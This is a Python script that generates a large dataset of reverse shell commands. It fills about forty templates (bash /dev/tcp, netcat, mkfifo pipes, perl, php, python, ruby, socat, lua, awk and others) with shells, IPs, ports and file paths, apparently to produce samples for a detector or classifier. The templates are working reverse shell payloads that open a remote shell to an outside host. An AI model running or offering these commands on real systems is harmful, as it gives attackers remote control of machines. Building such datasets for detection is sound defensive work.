
import random
import string
import time

REVERSE_SHELL_TEMPLATES = [
        # r"NIX_SHELL -i >& /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0>&1",
        # r"0<&FD_NUMBER;exec FD_NUMBER<>/dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER; NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER",
        #r"exec FD_NUMBER<>/dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER;cat <&FD_NUMBER | while read VARIABLE_NAME; do $VARIABLE_NAME 2>&FD_NUMBER >&FD_NUMBER; done",
        #r"NIX_SHELL -i FD_NUMBER<> /dev/PROTOCOL_TYPE/IP_ADDRESS/PORT_NUMBER 0<&FD_NUMBER 1>&FD_NUMBER 2>&FD_NUMBER",
        #r"rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc IP_ADDRESS PORT_NUMBER >FILE_PATH",
        # TEMP REMOVED
        # r"rm FILE_PATH;mkfifo FILE_PATH;cat FILE_PATH|NIX_SHELL -i 2>&1|nc -u IP_ADDRESS PORT_NUMBER >FILE_PATH",
        # r"nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER",
        # r"nc -eu NIX_SHELL IP_ADDRESS PORT_NUMBER",
        # r"nc -c NIX_SHELL IP_ADDRESS PORT_NUMBER",
        # r"nc -cu NIX_SHELL IP_ADDRESS PORT_NUMBER",
        # r"rcat IP_ADDRESS PORT_NUMBER -r NIX_SHELL",
        # r"""perl -e 'use Socket;$VARIABLE_NAME_1="IP_ADDRESS";$VARIABLE_NAME_2=PORT_NUMBER;socket(S,PF_INET,SOCK_STREAM,getprotobyname("PROTOCOL_TYPE"));if(connect(S,sockaddr_in($VARIABLE_NAME_1,inet_aton($VARIABLE_NAME_2)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("NIX_SHELL -i");};'""",
        # r"""perl -MIO -e '$VARIABLE_NAME_1=fork;exit,if($VARIABLE_NAME_1);$VARIABLE_NAME_2=new IO::Socket::INET(PeerAddr,"IP_ADDRESS:PORT_NUMBER");STDIN->fdopen($VARIABLE_NAME_2,r);$~->fdopen($VARIABLE_NAME_2,w);system$_ while<>;'""",
        # r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);shell_exec("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        # r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);exec("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);system("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        # r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);passthru("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER");'""",
        # r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);popen("NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER", "r");'""",
        # r"""php -r '$VARIABLE_NAME=fsockopen("IP_ADDRESS",PORT_NUMBER);`NIX_SHELL <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER`;'""",
        # r"""php -r '$VARIABLE_NAME_1=fsockopen("IP_ADDRESS",PORT_NUMBER);$VARIABLE_NAME_2=proc_open("NIX_SHELL", array(0=>$VARIABLE_NAME_1, 1=>$VARIABLE_NAME_1, 2=>$VARIABLE_NAME_1),$VARIABLE_NAME_2);'""",
        # r"""export VARIABLE_NAME_1="IP_ADDRESS";export VARIABLE_NAME_2=PORT_NUMBER;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("VARIABLE_NAME_1"),int(os.getenv("VARIABLE_NAME_2"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("NIX_SHELL")'""",
        # r"""export VARIABLE_NAME_1="IP_ADDRESS";export VARIABLE_NAME_2=PORT_NUMBER;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("VARIABLE_NAME_1"),int(os.getenv("VARIABLE_NAME_2"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'"""
        # r"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("NIX_SHELL")'""",
        r"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ADDRESS",PORT_NUMBER));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("NIX_SHELL")'""",
        # r"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("IP_ADDRESS",PORT_NUMBER));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("NIX_SHELL")'""",
        # r"""ruby -rsocket -e'spawn("NIX_SHELL",[:in,:out,:err]=>TCPSocket.new("IP_ADDRESS",PORT_NUMBER))'""",
        # r"""ruby -rsocket -e'spawn("NIX_SHELL",[:in,:out,:err]=>TCPSocket.new("IP_ADDRESS","PORT_NUMBER"))'""",
        # r"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("IP_ADDRESS",PORT_NUMBER);loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""",
        # r"""ruby -rsocket -e'exit if fork;c=TCPSocket.new("IP_ADDRESS","PORT_NUMBER");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'""",
        # r"""socat PROTOCOL_TYPE:IP_ADDRESS:PORT_NUMBER EXEC:NIX_SHELL"""
        # r"""socat PROTOCOL_TYPE:IP_ADDRESS:PORT_NUMBER EXEC:'NIX_SHELL',pty,stderr,setsid,sigint,sane""",
        # r"""VARIABLE_NAME=$(mktemp -u);mkfifo $VARIABLE_NAME && telnet IP_ADDRESS PORT_NUMBER 0<$VARIABLE_NAME | NIX_SHELL 1>$VARIABLE_NAME""",
        # r"""zsh -c 'zmodload zsh/net/tcp && ztcp IP_ADDRESS PORT_NUMBER && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",
        # r"""lua -e "require('socket');require('os');t=socket.PROTOCOL_TYPE();t:connect('IP_ADDRESS','PORT_NUMBER');os.execute('NIX_SHELL -i <&FD_NUMBER >&FD_NUMBER 2>&FD_NUMBER');""",
        # r"""lua5.1 -e 'local VARIABLE_NAME_1, VARIABLE_NAME_2 = "IP_ADDRESS", PORT_NUMBER local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(VARIABLE_NAME_1, VARIABLE_NAME_2); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'""",
        # r"""echo 'import os' > FILE_PATH.v && echo 'fn main() { os.system("nc -e NIX_SHELL IP_ADDRESS PORT_NUMBER 0>&1") }' >> FILE_PATH.v && v run FILE_PATH.v && rm FILE_PATH.v""",
        # r"""awk 'BEGIN {VARIABLE_NAME_1 = "/inet/PROTOCOL_TYPE/0/IP_ADDRESS/PORT_NUMBER"; while(FD_NUMBER) { do{ printf "shell>" |& VARIABLE_NAME_1; VARIABLE_NAME_1 |& getline VARIABLE_NAME_2; if(VARIABLE_NAME_2){ while ((VARIABLE_NAME_2 |& getline) > 0) print $0 |& VARIABLE_NAME_1; close(VARIABLE_NAME_2); } } while(VARIABLE_NAME_2 != "exit") close(VARIABLE_NAME_1); }}' /dev/null"""
    ]

# ===================
# HELPER FUNCTIONS
def get_random_ip(octets=4):
    return ".".join(map(str, (random.randint(0, 255) for _ in range(octets))))

def get_random_string(length=10):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))

def get_random_filepaths(count=1):
    path_roots = ["/tmp/", "/home/user/", "/var/www/"]
    folder_lenths = [1, 8]
    random_paths = []
    for _ in range(count):
        random_paths.append(random.choice(path_roots) + get_random_string(random.choice(folder_lenths)))
    return random_paths

def replace_and_generate(dataset, placeholder, value_func):
    new_dataset = []
    reverse_index_list = list(range(len(dataset)))[::-1]
    for idx in reverse_index_list:
        current_shell = dataset[idx]
        _ = dataset.pop(idx)
        values = value_func()
        for val in values:
            final_cmd = current_shell.replace(placeholder, str(val))
            new_dataset.append(final_cmd)
    return new_dataset


def generate_commands(templates, placeholder_dict):
    i = 0
    total = 0
    DATASET = []
    
    ip_values = placeholder_dict['IP_ADDRESS']()
    port_values = placeholder_dict['PORT_NUMBER']()

    for cmd in templates:
        start = time.time()
        dataset = []
        print(f"[!] Working with: {cmd}")

        for ip in ip_values:
            ip_cmd = cmd.replace('IP_ADDRESS', ip)
            
            for port in port_values:
                port_cmd = ip_cmd.replace('PORT_NUMBER', str(port))
                dataset_local = [port_cmd]

                for placeholder, value_func in placeholder_dict.items():
                    if placeholder in port_cmd:
                        dataset_local = replace_and_generate(dataset_local, placeholder, value_func)

                print(f"[*] Generating commands: {i}", end="\r")
                i += len(dataset_local)
                
                dataset.extend(dataset_local)

        dataset = list(set(dataset)) # removing duplicates -- just in case, but shouldn't be any
        total += len(dataset)
        print(f"[!] Number of unique commands during this round: {len(dataset)} | Took: {time.time() - start:.2f}s")
        DATASET.extend(dataset)

    print(f"[!] Generated total {total} commands.")
    return DATASET


# ===================
# CONFIG

NIX_SHELLS = ["sh", "bash", "dash"] #"tcsh", "zsh", "ksh", "pdksh", "ash", "bsh", "csh"]
NIX_SHELL_FOLDERS = ["/bin/", "/usr/bin/"] #, "/usr/local/bin/"]
FULL_SHELL_LIST = []
for shell in NIX_SHELLS:
    shell_fullpaths = [x+shell for x in NIX_SHELL_FOLDERS]
    FULL_SHELL_LIST.extend(shell_fullpaths + [shell])

NR_OF_RANDOM_PORTS = 1
NR_OF_RANDOM_IPS = 1
NR_OF_RANDOM_FILE_DESCRIPTORS = 1
NR_OF_RANDOM_FILEPATHS = 1
NR_OF_RANDOM_VARIABLES = 1 


placeholder_dict = {
    'NIX_SHELL': lambda: FULL_SHELL_LIST,
    'PROTOCOL_TYPE': lambda: ["tcp", "udp"],
    'FD_NUMBER': lambda: [int(random.uniform(0,200)) for _ in range(NR_OF_RANDOM_FILE_DESCRIPTORS)],
    'FILE_PATH': lambda: ["/tmp/f", "/tmp/t"] + get_random_filepaths(count=NR_OF_RANDOM_FILEPATHS),
    'VARIABLE_NAME': lambda: ["port", "host", "cmd", "p", "s", "c", ] + [get_random_string(length=4) for _ in range(NR_OF_RANDOM_VARIABLES)],
    'IP_ADDRESS': lambda: ["127.0.0.1"] + ["10."+get_random_ip(octets=3) for _ in range(NR_OF_RANDOM_IPS)],
    'PORT_NUMBER': lambda: [int(random.uniform(0,65535)) for _ in range(NR_OF_RANDOM_PORTS)] + [8080, 9001, 80, 443, 53, 22, 8000, 8888],
}

dataset = generate_commands(REVERSE_SHELL_TEMPLATES, placeholder_dict)